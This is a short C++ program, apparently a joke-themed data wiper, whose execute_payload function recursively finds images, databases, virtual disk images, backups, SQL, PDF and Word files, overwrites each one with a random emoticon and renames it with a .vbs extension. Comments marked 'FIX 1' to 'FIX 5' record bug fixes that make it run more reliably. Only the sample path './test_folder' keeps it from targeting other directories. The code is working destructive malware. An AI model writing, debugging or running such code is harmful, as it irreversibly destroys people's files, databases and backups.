#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <algorithm>
#include <vector>
#include <random>
#include <cctype> // FIX 2: Explicitly included for tolower

namespace fs = std::filesystem;
using namespace std;

void execute_payload(const string& target_path) {
    vector<string> emoticons = {":3", "OwO", ">w<", "^w^"};
    
    // FIX 4: Made random engine static so it initializes only once
    static random_device rd; 
    static mt19937 gen(rd());
    uniform_int_distribution<> emo_dist(0, emoticons.size() - 1);
    uniform_int_distribution<> chance_dist(1, 100);

    if (!fs::exists(target_path)) return;
    vector<fs::path> target_files;

    try {
        auto options = fs::directory_options::skip_permission_denied;
        for (auto& entry : fs::recursive_directory_iterator(target_path, options)) {
            if (!entry.is_regular_file()) continue;
            
            string ext = entry.path().extension().string();
            
            // FIX 1: Safe lambda expression to avoid ::tolower template matching issues
            transform(ext.begin(), ext.end(), ext.begin(), [](unsigned char c) { 
                return tolower(c); 
            });
            
            // FIX 3: Removed ".vbs" from the target list to avoid redundant checks later
            if (ext == ".jpg"  || ext == ".png"    || ext == ".mdf"     || ext == ".ldf"  || 
                ext == ".vhdx" || ext == ".vmdk"   || ext == ".parquet" || ext == ".avro" || 
                ext == ".bak"  || ext == ".sql"    || ext == ".json"    || ext == ".pdf"  || 
                ext == ".bat"  || ext == ".gdoc"   || ext == ".docx") 
            { 
                target_files.push_back(entry.path()); 
            }
        }
    } catch (const fs::filesystem_error& e) {
        // FIX 5: Standardized error logging instead of blind swallowing
        cerr << "Filesystem scanning error: " << e.what() << endl;
    }

    for (auto& file_path : target_files) {
        string chosen_string = (chance_dist(gen) == 1) ? "X3" : emoticons[emo_dist(gen)];
        
        try {
            // Explicit block scope releases the file handle immediately
            {
                ofstream stream(file_path, ios::trunc);
                if (stream.is_open()) {
                    stream << chosen_string;
                }
            } 

            // Double check safety check remains intact
            if (file_path.extension() != ".vbs") { 
                fs::rename(file_path, file_path.string() + ".vbs"); 
            }
        } catch (const exception& e) {
            cerr << "Failed to process file " << file_path << ": " << e.what() << endl;
        }
    }
}

int main() { 
    // Targets local test directory for execution environment safety
    execute_payload("./test_folder"); 
    return 0; 
}
